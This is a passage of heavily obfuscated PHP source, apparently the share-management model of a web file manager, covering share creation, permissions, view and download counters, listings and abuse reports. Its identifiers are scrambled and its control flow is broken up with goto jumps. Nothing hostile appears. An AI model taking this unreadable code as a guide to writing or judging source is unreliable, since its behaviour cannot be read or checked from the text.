$eîŒËÁğÈ¼ = $E¤×Œº¾ƒ·[1795]; } Model($E¤×Œº¾ƒ·[537])->eventShare($dõÊ­»­‘‘, $eîŒËÁğÈ¼); goto C¼öÃÍË«; FøŒ•æŞô: $eîŒËÁğÈ¼ = $E¤×Œº¾ƒ·[1793]; if ($f§Ä©à¼©Ğ[$E¤×Œº¾ƒ·[476]] == $E¤×Œº¾ƒ·[500] && $f®ËªÒñ[$E¤×Œº¾ƒ·[476]] == $E¤×Œº¾ƒ·[96]) { $eîŒËÁğÈ¼ = $E¤×Œº¾ƒ·[1791]; } if ($f§Ä©à¼©Ğ[$E¤×Œº¾ƒ·[476]] == $E¤×Œº¾ƒ·[96] && $f®ËªÒñ[$E¤×Œº¾ƒ·[476]] == $E¤×Œº¾ƒ·[500]) { $eîŒËÁğÈ¼ = $E¤×Œº¾ƒ·[1794]; } goto D•¾æ•Éâ; C¼öÃÍË«: return; goto cˆÃŞÓšÅ²; AìŠñŠ ØÈ: $E¤×Œº¾ƒ· =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($f²Œ„Œˆ­• == $E¤×Œº¾ƒ·[1019]) { if ($f®ËªÒñ[$E¤×Œº¾ƒ·[476]] == $E¤×Œº¾ƒ·[96]) { Model($E¤×Œº¾ƒ·[537])->eventShare($dõÊ­»­‘‘, $E¤×Œº¾ƒ·[1791]); } if ($f®ËªÒñ[$E¤×Œº¾ƒ·[478]] == $E¤×Œº¾ƒ·[96]) { Model($E¤×Œº¾ƒ·[537])->eventShare($dõÊ­»­‘‘, $E¤×Œº¾ƒ·[1792]); } return; } $f§Ä©à¼©Ğ = $this->getInfoByPath($dõÊ­»­‘‘); goto FøŒ•æŞô; cˆÃŞÓšÅ²: } private function _addShareData($dÙç–´á, $BË”œ¶½ÇÕ = array()) { goto f»´“ù‰¾š; EÍÂêÒÚ§: $Dëµ…Ÿó§ = $this->add($f‚ˆ‰ç”ë‚); $CƒÙ·³‹‡Æ = array($B³Ñ°Æ‹Ì[473] => short_id($Dëµ…Ÿó§)); $this->where(array($B³Ñ°Æ‹Ì[470] => $Dëµ…Ÿó§))->save($CƒÙ·³‹‡Æ); goto bÇ¶”¸Çë›; fßÙ¼Û¬: if ($bìÙÙßâƒ = $this->where($f°ÇœÁÒŠÌ)->find()) { return $bìÙÙßâƒ[$B³Ñ°Æ‹Ì[471]]; } if ($dÙç–´á == 0) { $BŠÑÙ¬Ì¤Š = array($B³Ñ°Æ‹Ì[28] => get_path_this($BË”œ¶½ÇÕ[$B³Ñ°Æ‹Ì[85]])); } else { $BŠÑÙ¬Ì¤Š = Model($B³Ñ°Æ‹Ì[759])->sourceInfo($dÙç–´á); if (!$BŠÑÙ¬Ì¤Š) { return !1; } } if (!$BË”œ¶½ÇÕ[$B³Ñ°Æ‹Ì[1393]]) { $BË”œ¶½ÇÕ[$B³Ñ°Æ‹Ì[1393]] = $BŠÑÙ¬Ì¤Š[$B³Ñ°Æ‹Ì[28]]; } goto DİÃ‡œ³¬Ã; bÇ¶”¸Çë›: return $Dëµ…Ÿó§; goto BÖôÌÆŞ˜; f»´“ù‰¾š: $B³Ñ°Æ‹Ì =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f°ÇœÁÒŠÌ = array($B³Ñ°Æ‹Ì[413] => $dÙç–´á, $B³Ñ°Æ‹Ì[1479] => USER_ID); if ($dÙç–´á == 0) { $f°ÇœÁÒŠÌ = array($B³Ñ°Æ‹Ì[1796] => $BË”œ¶½ÇÕ[$B³Ñ°Æ‹Ì[1031]], $B³Ñ°Æ‹Ì[1479] => USER_ID); } goto fßÙ¼Û¬; DİÃ‡œ³¬Ã: $f‚ˆ‰ç”ë‚ = array($B³Ñ°Æ‹Ì[1479] => USER_ID, $B³Ñ°Æ‹Ì[413] => $dÙç–´á, $B³Ñ°Æ‹Ì[1393] => $B³Ñ°Æ‹Ì[33], $B³Ñ°Æ‹Ì[476] => 0, $B³Ñ°Æ‹Ì[478] => 0, $B³Ñ°Æ‹Ì[1031] => $B³Ñ°Æ‹Ì[33], $B³Ñ°Æ‹Ì[312] => $B³Ñ°Æ‹Ì[33], $B³Ñ°Æ‹Ì[810] => $B³Ñ°Æ‹Ì[33], $B³Ñ°Æ‹Ì[1797] => 0, $B³Ñ°Æ‹Ì[1798] => 0, $B³Ñ°Æ‹Ì[479] => 0, $B³Ñ°Æ‹Ì[480] => $B³Ñ°Æ‹Ì[33], $B³Ñ°Æ‹Ì[473] => $B³Ñ°Æ‹Ì[33]); $fœ¼èğœ« = explode($B³Ñ°Æ‹Ì[47], $B³Ñ°Æ‹Ì[1799]); foreach ($fœ¼èğœ« as $FÌÊèÓâÃô) { if (!isset($BË”œ¶½ÇÕ[$FÌÊèÓâÃô])) { continue; } $f‚ˆ‰ç”ë‚[$FÌÊèÓâÃô] = $BË”œ¶½ÇÕ[$FÌÊèÓâÃô]; } goto EÍÂêÒÚ§; BÖôÌÆŞ˜: } private function _shareAuthSet($bÔ‘ëº£±­, $AğÏŒ•Ë˜) { goto b²á®•ÅÛø; b²á®•ÅÛø: $déÎ‹‡Ó¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!is_array($AğÏŒ•Ë˜)) { return !1; } $f²©ºÉŒÊ = Model($déÎ‹‡Ó¶[1750]); goto A¦ŸŒµ»˜ò; bŸÄÓ¾´Ú‡: return $f²©ºÉŒÊ->addAll($B–›Ñª‚, array(), !0); goto F›ßÜŒò‚¾; A¦ŸŒµ»˜ò: $f²©ºÉŒÊ->where(array($déÎ‹‡Ó¶[471] => $bÔ‘ëº£±­))->delete(); $B–›Ñª‚ = array(); foreach ($AğÏŒ•Ë˜ as $f×‹­áÀÏ×) { $f·ìÈÎŞ = SourceModel::TYPE_USER; if ($f×‹­áÀÏ×[$déÎ‹‡Ó¶[407]] == SourceModel::TYPE_GROUP) { $f·ìÈÎŞ = SourceModel::TYPE_GROUP; } $B²¶äŸè•È = array($déÎ‹‡Ó¶[471] => $bÔ‘ëº£±­, $déÎ‹‡Ó¶[407] => $f·ìÈÎŞ, $déÎ‹‡Ó¶[487] => intval($f×‹­áÀÏ×[$déÎ‹‡Ó¶[487]]), $déÎ‹‡Ó¶[1746] => 0, $déÎ‹‡Ó¶[1800] => -1); if ($f×‹­áÀÏ×[$déÎ‹‡Ó¶[1746]]) { $B²¶äŸè•È[$déÎ‹‡Ó¶[1746]] = $f×‹­áÀÏ×[$déÎ‹‡Ó¶[1746]]; } else { if ($f×‹­áÀÏ×[$déÎ‹‡Ó¶[1800]]) { $B²¶äŸè•È[$déÎ‹‡Ó¶[1800]] = $f×‹­áÀÏ×[$déÎ‹‡Ó¶[1800]]; } } $B–›Ñª‚[] = $B²¶äŸè•È; } goto bŸÄÓ¾´Ú‡; F›ßÜŒò‚¾: } public function numViewAdd($eŸæˆƒœ …) { $DÔ™À÷­…œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d¹ç«·˜¿ = array($DÔ™À÷­…œ[470] => $eŸæˆƒœ …); $this->where($d¹ç«·˜¿)->setAdd($DÔ™À÷­…œ[1797]); } public function numDownloadAdd($B¢Ë¡ˆ¤»Ü) { $dÜ‡öÆ¨’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E°†ëëëê• = array($dÜ‡öÆ¨’[470] => $B¢Ë¡ˆ¤»Ü); $this->where($E°†ëëëê•)->setAdd($dÜ‡öÆ¨’[1798]); } protected function shareEdit($Eõƒ¤‘¢°Œ, $E•Œ–Ÿ»ğ) { goto A´éòŒóõö; A´éòŒóõö: $fğêé©Ö»· =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DñàĞ§Åµ = $this->getInfo($Eõƒ¤‘¢°Œ); if (!$DñàĞ§Åµ) { return !1; } goto b§½ÔîŒÍ; b§½ÔîŒÍ: $this->_checkLinkShare($E•Œ–Ÿ»ğ, $DñàĞ§Åµ); $e¶ÊÙ¬…à = array(); $aÀ®ëÌ‡¶ = explode($fğêé©Ö»·[47], $fğêé©Ö»·[1801]); goto eŸ¸‡Éï‰; eŸ¸‡Éï‰: foreach ($aÀ®ëÌ‡¶ as $cœÛ÷ä´Š) { if (!array_key_exists($cœÛ÷ä´Š, $E•Œ–Ÿ»ğ)) { continue; } $e¶ÊÙ¬…à[$cœÛ÷ä´Š] = $E•Œ–Ÿ»ğ[$cœÛ÷ä´Š]; } $this->shareEventAdd($DñàĞ§Åµ[$fğêé©Ö»·[399]], $E•Œ–Ÿ»ğ, $fğêé©Ö»·[1617]); $this->where(array($fğêé©Ö»·[470] => $Eõƒ¤‘¢°Œ))->save($e¶ÊÙ¬…à); goto B§×’è; B§×’è: if (isset($E•Œ–Ÿ»ğ[$fğêé©Ö»·[1790]])) { $this->_shareAuthSet($Eõƒ¤‘¢°Œ, $E•Œ–Ÿ»ğ[$fğêé©Ö»·[1790]]); } return !0; goto a÷Ú˜£’ö; a÷Ú˜£’ö: } private function _checkLinkShare($céƒ°Íí‚Í, $eöõÇ“äÌØ) { goto FİËÕ³ßø; fê°†Ñ÷…: if ($eöõÇ“äÌØ[$Aì••†æ®µ[94]][$Aì••†æ®µ[29]] != $Aì••†æ®µ[201]) { $CóñŒÀÇµ = $this->_folderReport($Bó˜¼òÚÓØ); if (!$CóñŒÀÇµ) { return; } show_json(LNG($Aì••†æ®µ[1802]) . $Aì••†æ®µ[1803] . $CóñŒÀÇµ, !1); } $Eî†Ô¤Âê = Model($Aì••†æ®µ[759])->fileInfoGet($eöõÇ“äÌØ[$Aì••†æ®µ[94]][$Aì••†æ®µ[399]]); if (!$Eî†Ô¤Âê) { return; } goto C¶ôÑ¦¥Ğ”; FİËÕ³ßø: $Aì••†æ®µ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($céƒ°Íí‚Í[$Aì••†æ®µ[476]] != $Aì••†æ®µ[96]) { return; } $Bó˜¼òÚÓØ = $eöõÇ“äÌØ[$Aì••†æ®µ[94]][$Aì••†æ®µ[399]]; goto fê°†Ñ÷…; C¶ôÑ¦¥Ğ”: $F½´¾ÁË´± = $this->shareFileMeta($Eî†Ô¤Âê[$Aì••†æ®µ[450]]); if (isset($F½´¾ÁË´±[$Aì••†æ®µ[380]]) && $F½´¾ÁË´±[$Aì••†æ®µ[380]] == $Aì••†æ®µ[96]) { show_json(LNG($Aì••†æ®µ[1804]), !1); } goto EÔ‘Ö·„²ó; EÔ‘Ö·„²ó: } private function _folderReport($CÃÏÜØÃÔÃ) { goto F—Ü‚å‚Çè; aŞéĞ‚¸¸ê: $Dîº‰æ„“ = array_to_keyvalue($d¼‡£„İ­¥, $dœ•»³æ®õ[33], $dœ•»³æ®õ[28]); $Dîº‰æ„“[] = $d”­‘ÈØÄ½[$dœ•»³æ®õ[28]]; return implode($dœ•»³æ®õ[8], $Dîº‰æ„“); goto F¬°ê¸óĞ; F—Ü‚å‚Çè: $dœ•»³æ®õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cç‘¤³À‹õ = array($dœ•»³æ®õ[450] => array($dœ•»³æ®õ[930], 0), $dœ•»³æ®õ[694] => 3); $A§‰ŠŞ£ôŞ = Model($dœ•»³æ®õ[1805])->where($cç‘¤³À‹õ)->field($dœ•»³æ®õ[450])->select(); goto FÂ‘¡ĞÒ¶º; f…˜Æ•·…È: $a“‰×‘¨ëç = substr($d”­‘ÈØÄ½[$dœ•»³æ®õ[490]], strpos($d”­‘ÈØÄ½[$dœ•»³æ®õ[490]], $fùø±µ´§×)); $cç‘¤³À‹õ = array($dœ•»³æ®õ[399] => array($dœ•»³æ®õ[7], trim($a“‰×‘¨ëç, $dœ•»³æ®õ[47]))); $d¼‡£„İ­¥ = Model($dœ•»³æ®õ[759])->where($cç‘¤³À‹õ)->field($dœ•»³æ®õ[28])->select(); goto aŞéĞ‚¸¸ê; FÂ‘¡ĞÒ¶º: if (!$A§‰ŠŞ£ôŞ) { return !1; } $A§‰ŠŞ£ôŞ = array_to_keyvalue($A§‰ŠŞ£ôŞ, $dœ•»³æ®õ[33], $dœ•»³æ®õ[450]); $fùø±µ´§× = $dœ•»³æ®õ[47] . $CÃÏÜØÃÔÃ . $dœ•»³æ®õ[47]; goto d•Òêæ—¥; d•Òêæ—¥: $cç‘¤³À‹õ = array($dœ•»³æ®õ[450] => array($dœ•»³æ®õ[7], $A§‰ŠŞ£ôŞ), $dœ•»³æ®õ[490] => array($dœ•»³æ®õ[387], "\45{$fùø±µ´§×}\x25"), $dœ•»³æ®õ[426] => 0); $d”­‘ÈØÄ½ = Model($dœ•»³æ®õ[759])->where($cç‘¤³À‹õ)->field($dœ•»³æ®õ[1806])->find(); if (!$d”­‘ÈØÄ½) { return !1; } goto f…˜Æ•·…È; F¬°ê¸óĞ: } protected function remove($FòÏ”ˆ¹™¯) { goto A‰Ä¼á±¢à; a’éÚ‹Œç‡: $eÌµ´‚‹ŠÉ = $this->where($B“İ¾Âˆ—á)->delete(); if ($eÌµ´‚‹ŠÉ) { Model($d©îç¼²ÍÂ[568])->where(array($d©îç¼²ÍÂ[471] => $FòÏ”ˆ¹™¯))->delete(); } $d•É‰šßÒÌ = is_array($FòÏ”ˆ¹™¯) ? $FòÏ”ˆ¹™¯[1] : array($FòÏ”ˆ¹™¯); goto c¨š’ÃğŠÅ; A‰Ä¼á±¢à: $d©îç¼²ÍÂ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_array($FòÏ”ˆ¹™¯)) { $FòÏ”ˆ¹™¯ = array($d©îç¼²ÍÂ[7], $FòÏ”ˆ¹™¯); } $B“İ¾Âˆ—á = array($d©îç¼²ÍÂ[471] => $FòÏ”ˆ¹™¯); goto a’éÚ‹Œç‡; c¨š’ÃğŠÅ: for ($F¦ğ‡«³– = 0; $F¦ğ‡«³– < count($d•É‰šßÒÌ); $F¦ğ‡«³–++) { $Eğ³½¦¿÷¡ = $this->getInfo($d•É‰šßÒÌ[$F¦ğ‡«³–]); if ($Eğ³½¦¿÷¡[$d©îç¼²ÍÂ[478]] == $d©îç¼²ÍÂ[96]) { Model($d©îç¼²ÍÂ[537])->eventShare($Eğ³½¦¿÷¡[$d©îç¼²ÍÂ[399]], $d©îç¼²ÍÂ[1795]); } if ($Eğ³½¦¿÷¡[$d©îç¼²ÍÂ[476]] == $d©îç¼²ÍÂ[96]) { Model($d©îç¼²ÍÂ[537])->eventShare($Eğ³½¦¿÷¡[$d©îç¼²ÍÂ[399]], $d©îç¼²ÍÂ[1794]); } } return $eÌµ´‚‹ŠÉ; goto dçˆ¡½øàÑ; dçˆ¡½øàÑ: } protected function removeBySource($fË…ñõÈ…») { goto BÄ ĞêÖ¸ó; FäÌçŞ‘ª: $this->where($E†¡‰ŸŒÀä)->delete(); Model($E¾öèµã¤Å[568])->where($E†¡‰ŸŒÀä)->delete(); goto C†‚¥¾…ë; BÄ ĞêÖ¸ó: $E¾öèµã¤Å =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E†¡‰ŸŒÀä = array($E¾öèµã¤Å[413] => array($E¾öèµã¤Å[414], $fË…ñõÈ…»)); $D‰âà„Ñœ = $this->field($E¾öèµã¤Å[471])->where($E†¡‰ŸŒÀä)->select(); goto C¸‹—Çé; C¸‹—Çé: $D‰âà„Ñœ = array_to_keyvalue($D‰âà„Ñœ, $E¾öèµã¤Å[33], $E¾öèµã¤Å[471]); if (!$D‰âà„Ñœ) { return; } $E†¡‰ŸŒÀä = array($E¾öèµã¤Å[470] => array($E¾öèµã¤Å[414], $D‰âà„Ñœ)); goto FäÌçŞ‘ª; C†‚¥¾…ë: } public function listAll($E®Áí¯Šõê) { goto CÔ†”ëÉâ; FòÕØÕäˆ«: $F£ºíÂìµò = $this->_makeOrder()->where($FÃŠ™‡ÂÂ)->selectPage(20); if (empty($F£ºíÂìµò[$CãÎ¢ÕÁ³Â[375]])) { return array(); } $this->_listDataApply($F£ºíÂìµò[$CãÎ¢ÕÁ³Â[375]]); goto D’ê²ÂÜ¹¿; CÔ†”ëÉâ: $CãÎ¢ÕÁ³Â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÃŠ™‡ÂÂ = array(); if ($E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[1487]]) { $FÃŠ™‡ÂÂ[$CãÎ¢ÕÁ³Â[1487]] = $E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[1487]]; } goto C³Çº×£®Ë; D’ê²ÂÜ¹¿: return $F£ºíÂìµò; goto fŒ†˜´ïÜé; C³Çº×£®Ë: if ($E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[707]]) { $cƒô¢¶áŠô = $E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[479]] ? $E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[479]] : strtotime(date($CãÎ¢ÕÁ³Â[1807])); $FÃŠ™‡ÂÂ[$CãÎ¢ÕÁ³Â[202]] = array($CãÎ¢ÕÁ³Â[338], array($E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[707]], $cƒô¢¶áŠô)); } if ($E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[29]]) { $FÃŠ™‡ÂÂ[$E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[29]]] = 1; } else { $FÃŠ™‡ÂÂ[] = array($CãÎ¢ÕÁ³Â[476] => array($CãÎ¢ÕÁ³Â[930], 0), $CãÎ¢ÕÁ³Â[478] => array($CãÎ¢ÕÁ³Â[930], 0), $CãÎ¢ÕÁ³Â[1784] => $CãÎ¢ÕÁ³Â[1738]); } if ($E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[1734]]) { $FÃŠ™‡ÂÂ[] = array($CãÎ¢ÕÁ³Â[473] => $E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[1734]], $CãÎ¢ÕÁ³Â[1393] => array($CãÎ¢ÕÁ³Â[387], "\x25{$E®Áí¯Šõê[$CãÎ¢ÕÁ³Â[1734]]}\x25"), $CãÎ¢ÕÁ³Â[1784] => $CãÎ¢ÕÁ³Â[1738]); } goto FòÕØÕäˆ«; fŒ†˜´ïÜé: } public function listDataApply($d‘¡Ô¤Å‰Å) { $this->_listDataApply($d‘¡Ô¤Å‰Å); return $d‘¡Ô¤Å‰Å; } private function _listDataApply(&$bóï¾½¢ÚÇ) { goto DàÊ•Â•¡Ù; DàÊ•Â•¡Ù: $BŒ˜ë¼Ø¢ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e“À¢‘äÎÆ = array_to_keyvalue($bóï¾½¢ÚÇ, $BŒ˜ë¼Ø¢[33], $BŒ˜ë¼Ø¢[1487]); $côğ¯¸‘Æé = Model($BŒ˜ë¼Ø¢[510])->userListInfo(array_unique($e“À¢‘äÎÆ)); goto D’§‡Ãè§­; aÓ•ïƒ¢„­: unset($A©ïõ¼ˆé); $bóï¾½¢ÚÇ = array_values($bóï¾½¢ÚÇ); goto F±îƒĞÁõ; D’§‡Ãè§­: $c¬ ºÙ‰ÊÍ = array_to_keyvalue($bóï¾½¢ÚÇ, $BŒ˜ë¼Ø¢[33], $BŒ˜ë¼Ø¢[399]); $D„ÏÓÕ·ê® = Model($BŒ˜ë¼Ø¢[759])->sourceListInfo($c¬ ºÙ‰ÊÍ, !0); foreach ($bóï¾½¢ÚÇ as $AŸ›‹²Ş• => &$A©ïõ¼ˆé) { $e‹Ïğ­ÄÚ“ = $A©ïõ¼ˆé[$BŒ˜ë¼Ø¢[1487]]; $A©ïõ¼ˆé[$BŒ˜ë¼Ø¢[1808]] = $côğ¯¸‘Æé[$e‹Ïğ­ÄÚ“] ? $côğ¯¸‘Æé[$e‹Ïğ­ÄÚ“] : !1; $E–æÄ•ã‰ = $A©ïõ¼ˆé[$BŒ˜ë¼Ø¢[399]]; $A©ïõ¼ˆé[$BŒ˜ë¼Ø¢[94]] = $D„ÏÓÕ·ê®[$E–æÄ•ã‰] ? $D„ÏÓÕ·ê®[$E–æÄ•ã‰] : !1; if (!$A©ïõ¼ˆé[$BŒ˜ë¼Ø¢[94]] || $A©ïõ¼ˆé[$BŒ˜ë¼Ø¢[94]][$BŒ˜ë¼Ø¢[426]] == $BŒ˜ë¼Ø¢[96]) { unset($bóï¾½¢ÚÇ[$AŸ›‹²Ş•]); } } goto aÓ•ïƒ¢„­; F±îƒĞÁõ: } private function _makeOrder($F£´šÚôøà = '') { goto Cùò£âÉ”°; EÌ‚ŞêØ²Ş: $F£´šÚôøà = $F£´šÚôøà . "{$Bå¨æÀËß}\40{$aøŸ†¦›ƒ}"; return $this->order($F£´šÚôøà); goto eÖ„„£´™µ; Cùò£âÉ”°: $B ‘–ÈË®ø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¿¿Õ¢Ëö = array($B ‘–ÈË®ø[202], $B ‘–ÈË®ø[479], $B ‘–ÈË®ø[1797], $B ‘–ÈË®ø[1798]); $Fø›Î‹Â¥ = array($B ‘–ÈË®ø[431] => $B ‘–ÈË®ø[432], $B ‘–ÈË®ø[433] => $B ‘–ÈË®ø[434]); goto D×Ìàá¤ƒ¦; D×Ìàá¤ƒ¦: $Bå¨æÀËß = Input::get($B ‘–ÈË®ø[438], $B ‘–ÈË®ø[7], $B ‘–ÈË®ø[419], $b¿¿Õ¢Ëö); $aøŸ†¦›ƒ = Input::get($B ‘–ÈË®ø[439], $B ‘–ÈË®ø[7], $B ‘–ÈË®ø[1809], array($B ‘–ÈË®ø[1733], $B ‘–ÈË®ø[433])); $aøŸ†¦›ƒ = $Fø›Î‹Â¥[$aøŸ†¦›ƒ]; goto EÌ‚ŞêØ²Ş; eÖ„„£´™µ: } public function reportAdd($A§®î ¤ˆø) { $Féà¹¥©»“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f²áà…ãæĞ = array($Féà¹¥©»“[471] => $A§®î ¤ˆø[$Féà¹¥©»“[471]], $Féà¹¥©»“[1487] => USER_ID); if (Model($Féà¹¥©»“[1805])->where($f²áà…ãæĞ)->find()) { return !1; } $c¥öì—ÖÇ„ = array($Féà¹¥©»“[471] => $A§®î ¤ˆø[$Féà¹¥©»“[471]], $Féà¹¥©»“[1393] => $A§®î ¤ˆø[$Féà¹¥©»“[1393]], $Féà¹¥©»“[399] => $A§®î ¤ˆø[$Féà¹¥©»“[399]], $Féà¹¥©»“[450] => $A§®î ¤ˆø[$Féà¹¥©»“[450]], $Féà¹¥©»“[1487] => USER_ID, $Féà¹¥©»“[29] => $A§®î ¤ˆø[$Féà¹¥©»“[29]], $Féà¹¥©»“[434] => $A§®î ¤ˆø[$Féà¹¥©»“[434]]); return Model($Féà¹¥©»“[1805])->add($c¥öì—ÖÇ„); } public function reportList($BÓš·©‰×·) { goto fŞÔÑ½ËŠÇ; Céëô‡ó–œ: $this->_listDataApply($FåÂŞòÁ[$b‡İâ¢ÆÔ•[375]]); return $FåÂŞòÁ; goto dö†ÎŒ‡šÂ; Cë¯¿¤®Á: if (empty($FåÂŞòÁ[$b‡İâ¢ÆÔ•[375]])) { return array(); } $e“ËÒÈÄ½— = array_to_keyvalue_group($FåÂŞòÁ[$b‡İâ¢ÆÔ•[375]], $b‡İâ¢ÆÔ•[694], $b‡İâ¢ÆÔ•[471]); if (!empty($e“ËÒÈÄ½—[0])) { $BÓš·©‰×· = $e“ËÒÈÄ½—[0]; $c»´ĞíŒÅÎ = array($b‡İâ¢ÆÔ•[471] => array($b‡İâ¢ÆÔ•[7], $BÓš·©‰×·)); $e‡­„¸å†Ü = $this->where($c»´ĞíŒÅÎ)->field($b‡İâ¢ÆÔ•[471])->select(); $e‡­„¸å†Ü = array_to_keyvalue($e‡­„¸å†Ü, $b‡İâ¢ÆÔ•[33], $b‡İâ¢ÆÔ•[471]); $DÂä‘õˆíŠ = array_diff($BÓš·©‰×·, $e‡­„¸å†Ü); if (!empty($DÂä‘õˆíŠ)) { foreach ($FåÂŞòÁ[$b‡İâ¢ÆÔ•[375]] as $e¼šÕ¨‡Ë¡ => $cë¼ç´àÓ) { if (in_array($cë¼ç´àÓ[$b‡İâ¢ÆÔ•[471]], $DÂä‘õˆíŠ)) { unset($FåÂŞòÁ[$b‡İâ¢ÆÔ•[375]][$e¼šÕ¨‡Ë¡]); } } } } goto Céëô‡ó–œ; D¹áÈ©¦™¬: $AšùÃëİ§ñ = array($b‡İâ¢ÆÔ•[431] => $b‡İâ¢ÆÔ•[432], $b‡İâ¢ÆÔ•[433] => $b‡İâ¢ÆÔ•[434]); $fÖøé×¨¨² = $b‡İâ¢ÆÔ•[1814] . $AšùÃëİ§ñ[$CÂ‡ê ‹—¡]; $FåÂŞòÁ = Model($b‡İâ¢ÆÔ•[1805])->where($c»´ĞíŒÅÎ)->order($fÖøé×¨¨²)->selectPage(20); goto Cë¯¿¤®Á; fŞÔÑ½ËŠÇ: $b‡İâ¢ÆÔ• =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c»´ĞíŒÅÎ = array(); if ($BÓš·©‰×·[$b‡İâ¢ÆÔ•[707]]) { $AªÌñ²ºÇ = $BÓš·©‰×·[$b‡İâ¢ÆÔ•[479]] ? $BÓš·©‰×·[$b‡İâ¢ÆÔ•[479]] : strtotime(date($b‡İâ¢ÆÔ•[1807])); $c»´ĞíŒÅÎ[$b‡İâ¢ÆÔ•[202]] = array($b‡İâ¢ÆÔ•[338], array($BÓš·©‰×·[$b‡İâ¢ÆÔ•[707]], $AªÌñ²ºÇ)); } goto E³ŸÖ¶»¼¦; E³ŸÖ¶»¼¦: if (isset($BÓš·©‰×·[$b‡İâ¢ÆÔ•[29]]) && in_array($BÓš·©‰×·[$b‡İâ¢ÆÔ•[29]], array($b‡İâ¢ÆÔ•[96], $b‡İâ¢ÆÔ•[1810], $b‡İâ¢ÆÔ•[1811], $b‡İâ¢ÆÔ•[1812], $b‡İâ¢ÆÔ•[1813]))) { $c»´ĞíŒÅÎ[$b‡İâ¢ÆÔ•[29]] = $BÓš·©‰×·[$b‡İâ¢ÆÔ•[29]]; } if (isset($BÓš·©‰×·[$b‡İâ¢ÆÔ•[694]]) && in_array($BÓš·©‰×·[$b‡İâ¢ÆÔ•[694]], array($b‡İâ¢ÆÔ•[500], $b‡İâ¢ÆÔ•[96], $b‡İâ¢ÆÔ•[1810], $b‡İâ¢ÆÔ•[1811]))) { $c»´ĞíŒÅÎ[$b‡İâ¢ÆÔ•[694]] = $BÓš·©‰×·[$b‡İâ¢ÆÔ•[694]]; } $CÂ‡ê ‹—¡ = Input::get($b‡İâ¢ÆÔ•[439], $b‡İâ¢ÆÔ•[7], $b‡İâ¢ÆÔ•[1809], array($b‡İâ¢ÆÔ•[1733], $b‡İâ¢ÆÔ•[433])); goto D¹áÈ©¦™¬; dö†ÎŒ‡šÂ: } public function reportStatus($d…ö¦„µ©˜) { goto EÃ‘Ù³š²; fõËÅÓŒ: $d»¢†å ¸é = Model($d¸õ­ñø¯ñ[1805])->where($E‡Ñ±¿Æ½Œ)->save($aŞæ‚‹Ò¦­); if ($d…ö¦„µ©˜[$d¸õ­ñø¯ñ[694]] == $d¸õ­ñø¯ñ[1810]) { if ($AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[450]] != $d¸õ­ñø¯ñ[500] && $this->shareFileMeta($AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[450]])) { $this->shareFileMeta($AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[450]], 0); } $this->remove($AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[471]]); return !0; } if ($d»¢†å ¸é && $d…ö¦„µ©˜[$d¸õ­ñø¯ñ[694]] == $d¸õ­ñø¯ñ[1811]) { $bâÁ„Ñ·±„ = $aŞæ‚‹Ò¦­[$d¸õ­ñø¯ñ[694]] == $d¸õ­ñø¯ñ[1811] ? 1 : 0; $this->shareFileMeta($AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[450]], $bâÁ„Ñ·±„); $this->removeByFile($AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[450]]); } goto D¢×¬µ¹í…; EÃ‘Ù³š²: $d¸õ­ñø¯ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E‡Ñ±¿Æ½Œ = array($d¸õ­ñø¯ñ[397] => $d…ö¦„µ©˜[$d¸õ­ñø¯ñ[397]]); $AßÅ„¼Ç‰® = Model($d¸õ­ñø¯ñ[1805])->where($E‡Ñ±¿Æ½Œ)->field($d¸õ­ñø¯ñ[1815])->find(); goto E‰ÈÜğ¬¾‡; D¢×¬µ¹í…: return $d»¢†å ¸é; goto B‰à–Œ•§; E‰ÈÜğ¬¾‡: if (!$AßÅ„¼Ç‰®) { return !1; } $aŞæ‚‹Ò¦­ = array($d¸õ­ñø¯ñ[694] => $d…ö¦„µ©˜[$d¸õ­ñø¯ñ[694]]); if ($d…ö¦„µ©˜[$d¸õ­ñø¯ñ[694]] == $d¸õ­ñø¯ñ[1811] && $AßÅ„¼Ç‰®[$d¸õ­ñø¯ñ[694]] == $d¸õ­ñø¯ñ[1811]) { $aŞæ‚‹Ò¦­[$d¸õ­ñø¯ñ[694]] = 0; } goto fõËÅÓŒ; B‰à–Œ•§: } private function removeByFile($C¨ï‰¹Šğ) { goto aÉõµº¹Î; fÄá¯‚Æ´ª: $e´İÍøš° = array_to_keyvalue($a§‡ÕÜ‹”ä, $E»íİ÷ÑœÅ[33], $E»íİ÷ÑœÅ[471]); $this->remove($e´İÍøš°); goto EÁ¸‰ŒÍÉˆ; f–Ë¾ÚÅ´: $e²†óÌèã = array($E»íİ÷ÑœÅ[399] => array($E»íİ÷ÑœÅ[7], $AÚ÷Ø¯¤’Ê), $E»íİ÷ÑœÅ[476] => 1); $a§‡ÕÜ‹”ä = $this->where($e²†óÌèã)->field($E»íİ÷ÑœÅ[471])->select(); if (empty($a§‡ÕÜ‹”ä)) { return; } goto 